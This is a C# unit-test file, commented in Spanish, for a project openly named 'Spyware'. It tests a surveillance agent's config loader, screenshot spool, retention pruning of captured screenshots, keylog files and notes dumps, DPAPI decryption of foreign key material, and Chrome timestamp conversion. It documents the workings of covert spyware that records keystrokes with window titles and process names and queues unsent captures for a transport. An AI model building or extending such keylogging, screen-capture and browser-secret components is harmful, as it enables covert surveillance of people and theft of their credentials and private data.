using System.Text;
using Spyware.Core.Configuration;
using Spyware.Core.Contracts;
using Spyware.Core.Logging;
using Spyware.Core.Paths;
using Spyware.Core.Security;
using Spyware.Storage;
using Xunit;

namespace Spyware.UnitTests;

/// <summary>Configuración, spool y retención: todo en texto plano sobre disco.</summary>
public sealed class CoreAndStorageTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), "spyware-core-" + Guid.NewGuid().ToString("N"));

    [Fact]
    public void Config_CreaArchivoEnClaro_YConservaLosValores()
    {
        AgentPaths paths = new(Path.Combine(_root, "config-normal"));
        var log = new TestLog();

        AgentConfig first = ConfigLoader.LoadOrCreate(paths, log);
        Assert.False(string.IsNullOrWhiteSpace(first.AgentId));
        Assert.True(File.Exists(paths.ConfigFile));
        Assert.Equal("local", first.Transport.Mode);
        Assert.False(first.Storage.EncryptLocalData);

        // El archivo se lee tal cual: sin capa de cifrado.
        string raw = File.ReadAllText(paths.ConfigFile);
        Assert.Contains("\"agentId\":", raw, StringComparison.Ordinal);
        Assert.Contains(first.AgentId, raw, StringComparison.Ordinal);
        Assert.Contains("\"encryptLocalData\": false", raw, StringComparison.Ordinal);

        AgentConfig second = ConfigLoader.LoadOrCreate(paths, log);
        Assert.Equal(first.AgentId, second.AgentId);
    }

    [Fact]
    public void Config_Corrupto_SeRespaldaYVuelvePorDefecto()
    {
        AgentPaths paths = new(Path.Combine(_root, "config-roto"));
        paths.EnsureDirectories();
        File.WriteAllText(paths.ConfigFile, "{ esto no es json ");

        AgentConfig fallback = ConfigLoader.LoadOrCreate(paths, new TestLog());

        Assert.False(string.IsNullOrWhiteSpace(fallback.AgentId));
        Assert.Equal("local", fallback.Transport.Mode);
        Assert.Contains(Directory.GetFiles(paths.RootDirectory, "config.json.bad-*"), f => File.Exists(f));
    }

    [Theory]
    [InlineData("debug", LogLevel.Debug)]
    [InlineData("WARN", LogLevel.Warn)]
    [InlineData("error", LogLevel.Error)]
    [InlineData("Information", LogLevel.Info)]
    [InlineData("nada-de-esto", LogLevel.Info)]
    public void Config_NivelDeLog_ToleraMayusculasYValoresRaros(string level, LogLevel expected) =>
        Assert.Equal(expected, ConfigLoader.ParseLevel(level));

    [Fact]
    public void Spool_NombraLosArchivosDentroDelDirectorioDeDatos()
    {
        AgentPaths paths = new(Path.Combine(_root, "spool"));
        paths.EnsureDirectories();
        var spool = new SpoolManager(paths, new TestLog());

        byte[] jpeg = { 0xFF, 0xD8, 0xFF, 0xE0, 0x01, 0x02 };
        string saved = spool.SaveScreenshot(jpeg, new DateTime(2026, 3, 4, 5, 6, 7, DateTimeKind.Utc));

        Assert.Equal(Path.Combine(paths.ScreenshotDirectory, "scr_20260304T050607Z_" +
            HashHelper.Short(HashHelper.Sha256Hex(jpeg)) + ".jpg"), saved);
        Assert.Equal(jpeg, File.ReadAllBytes(saved));
        Assert.StartsWith("scr_", Path.GetFileName(saved), StringComparison.Ordinal);
        Assert.True(spool.GetManagedStorageBytes() >= jpeg.Length);
    }

    [Fact]
    public void Retencion_PorEdad_BorraArchivoYFila()
    {
        AgentPaths paths = new(Path.Combine(_root, "retencion-edad"));
        paths.EnsureDirectories();
        var log = new TestLog();
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        string oldFile = Path.Combine(paths.ScreenshotDirectory, "vieja.jpg");
        File.WriteAllText(oldFile, "jpeg-falso");

        repository.InsertScreenshot(new ScreenshotEvent
        {
            TimestampUtc = DateTime.UtcNow.AddDays(-30),
            Path = oldFile,
            Width = 100,
            Height = 80,
            Hash = "v",
            Bytes = 10
        });

        var policy = new RetentionPolicy(paths, repository, new SpoolManager(paths, log),
            new StorageSection { MaxDays = 7, MaxSizeMb = 0, PruneIntervalMinutes = 60 }, log);
        policy.Apply();

        Assert.False(File.Exists(oldFile));
        Assert.Empty(repository.GetUnsentScreenshots(10));
        Assert.Equal(0, repository.CountUnsent());
    }

    [Fact]
    public void Retencion_PorTamaño_ConservaLosArchivosMasNuevos()
    {
        AgentPaths paths = new(Path.Combine(_root, "retencion-tamano"));
        paths.EnsureDirectories();
        var log = new TestLog();
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        var written = new List<string>();
        DateTime baseTime = DateTime.UtcNow.AddMinutes(-30);
        for (int index = 0; index < 3; index++)
        {
            string file = Path.Combine(paths.ScreenshotDirectory, $"cap{index}.jpg");
            File.WriteAllBytes(file, new byte[600 * 1024]);
            File.SetLastWriteTimeUtc(file, baseTime.AddMinutes(index));
            written.Add(file);

            repository.InsertScreenshot(new ScreenshotEvent
            {
                TimestampUtc = baseTime.AddMinutes(index),
                Path = file,
                Width = 100,
                Height = 80,
                Hash = "h" + index,
                Bytes = 600 * 1024
            });
        }

        var policy = new RetentionPolicy(paths, repository, new SpoolManager(paths, log),
            new StorageSection { MaxDays = 0, MaxSizeMb = 1, PruneIntervalMinutes = 60 }, log);
        policy.Apply();

        int remaining = written.Count(File.Exists);
        Assert.InRange(remaining, 1, 2);
        Assert.True(File.Exists(written[2]), "el archivo más reciente debe conservarse");
        Assert.True(new SpoolManager(paths, log).GetManagedStorageBytes() <= 1024 * 1024 + 256 * 1024);
    }

    [Fact]
    public void Retencion_PorEdad_BorraTambienLaFilaDeTecladoConArchivo()
    {
        AgentPaths paths = new(Path.Combine(_root, "retencion-teclado-edad"));
        paths.EnsureDirectories();
        var log = new TestLog();
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        string oldCopy = Path.Combine(paths.KeylogDirectory, "keys_vieja.txt");
        File.WriteAllText(oldCopy, "texto de keylog antiguo");

        repository.InsertKeyEvent(new KeyEvent
        {
            TimestampUtc = DateTime.UtcNow.AddDays(-30),
            StartedUtc = DateTime.UtcNow.AddDays(-30),
            Text = "clave antigua",
            KeyCount = 12,
            CharCount = 13,
            WindowTitle = "Consola",
            ProcessName = "pwsh",
            Hash = "hash-viejo",
            FilePath = oldCopy
        });

        var policy = new RetentionPolicy(paths, repository, new SpoolManager(paths, log),
            new StorageSection { MaxDays = 7, MaxSizeMb = 0, PruneIntervalMinutes = 60 }, log);
        policy.Apply();

        Assert.False(File.Exists(oldCopy));
        Assert.Equal(0, repository.GetStats()["keystrokes"]);
    }

    [Fact]
    public void Retencion_PorTamano_BorraTambienLaFilaDeTecladoAsociada()
    {
        AgentPaths paths = new(Path.Combine(_root, "retencion-teclado-tamano"));
        paths.EnsureDirectories();
        var log = new TestLog();
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        var written = new List<string>();
        DateTime baseTime = DateTime.UtcNow.AddMinutes(-30);

        for (int index = 0; index < 3; index++)
        {
            string file = Path.Combine(paths.KeylogDirectory, $"keys_{index}.txt");
            File.WriteAllText(file, new string('x', 600 * 1024));
            File.SetLastWriteTimeUtc(file, baseTime.AddMinutes(index));
            written.Add(file);

            repository.InsertKeyEvent(new KeyEvent
            {
                TimestampUtc = baseTime.AddMinutes(index),
                StartedUtc = baseTime.AddMinutes(index),
                Text = "ráfaga " + index,
                KeyCount = index,
                CharCount = 7,
                Hash = "h" + index,
                FilePath = file
            });
        }

        var policy = new RetentionPolicy(paths, repository, new SpoolManager(paths, log),
            new StorageSection { MaxDays = 0, MaxSizeMb = 1, PruneIntervalMinutes = 60 }, log);
        policy.Apply();

        // Ninguna fila puede quedar apuntando a un .txt ya borrado de storage\keylog.
        Assert.True(File.Exists(written[2]), "la copia ráfaga más reciente debe conservarse");

        foreach (KeystrokeRow row in repository.GetUnsentKeystrokes(10))
            Assert.True(File.Exists(row.FilePath), "la fila sobrevive solo si su archivo existe");
    }

    [Fact]
    public void Retencion_PorEdad_BorraVolcadosDeNotasSinFila()
    {
        AgentPaths paths = new(Path.Combine(_root, "retencion-notas-edad"));
        paths.EnsureDirectories();
        var log = new TestLog();
        using var repository = new LocalEventRepository(paths.StorageDb, log);
        repository.Initialize();

        // notes_*.json no tiene columna de ruta en la base: sin barrido de huérfanos no vencería.
        string stale = Path.Combine(paths.NoteDirectory, "notes_viejo.json");
        File.WriteAllText(stale, "[]");
        File.SetLastWriteTimeUtc(stale, DateTime.UtcNow.AddDays(-30));

        string fresh = Path.Combine(paths.NoteDirectory, "notes_nuevo.json");
        File.WriteAllText(fresh, "[]");

        var policy = new RetentionPolicy(paths, repository, new SpoolManager(paths, log),
            new StorageSection { MaxDays = 7, MaxSizeMb = 0, PruneIntervalMinutes = 60 }, log);
        policy.Apply();

        Assert.False(File.Exists(stale));
        Assert.True(File.Exists(fresh));
    }

    [Fact]
    public void Dpapi_SoloDescifraMaterialAjeno_YHashHelperEsEstable()
    {
        byte[] material = Encoding.UTF8.GetBytes("clave-ajena");
        byte[] protegido = System.Security.Cryptography.ProtectedData.Protect(
            material, optionalEntropy: null, System.Security.Cryptography.DataProtectionScope.CurrentUser);

        Assert.True(DpapiHelper.TryUnprotectToString(protegido, out string recuperado));
        Assert.Equal("clave-ajena", recuperado);

        // Blob inválido: no lanza, devuelve false (otro usuario/máquina).
        Assert.False(DpapiHelper.TryUnprotect(new byte[] { 1, 2, 3 }, out _));

        Assert.Equal(64, HashHelper.Sha256Hex("abc").Length);
        Assert.Equal("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad", HashHelper.Sha256Hex("abc"));
        Assert.Equal("ba7816bf", HashHelper.Short(HashHelper.Sha256Hex("abc")));
        Assert.Equal(material, HashHelper.FromBase64(HashHelper.ToBase64(material)));
    }

    [Fact]
    public void ChromeTime_ConvierteMicrosDesde1601()
    {
        var instant = new DateTime(2026, 10, 24, 12, 0, 0, DateTimeKind.Utc);
        long microseconds = (instant.Ticks - new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc).Ticks) / 10;

        DateTime? converted = Spyware.Collectors.Browsers.ChromeTime.FromMicroseconds(microseconds);

        Assert.NotNull(converted);
        Assert.Equal(instant, converted!.Value);
        Assert.Null(Spyware.Collectors.Browsers.ChromeTime.FromMicroseconds(0));
        Assert.Null(Spyware.Collectors.Browsers.ChromeTime.FromMicroseconds(null));
    }

    public void Dispose()
    {
        try { Microsoft.Data.Sqlite.SqliteConnection.ClearAllPools(); } catch { /* mejor esfuerzo */ }
        try { if (Directory.Exists(_root)) Directory.Delete(_root, recursive: true); } catch { /* mejor esfuerzo */ }
    }

    private sealed class TestLog : ILog
    {
        public LogLevel MinimumLevel { get; set; } = LogLevel.Debug;
        public bool MirrorToConsole { get; set; }

        public void Debug(string message) { }
        public void Info(string message) { }
        public void Warn(string message) { }
        public void Error(string message, Exception? exception = null) { }
    }
}
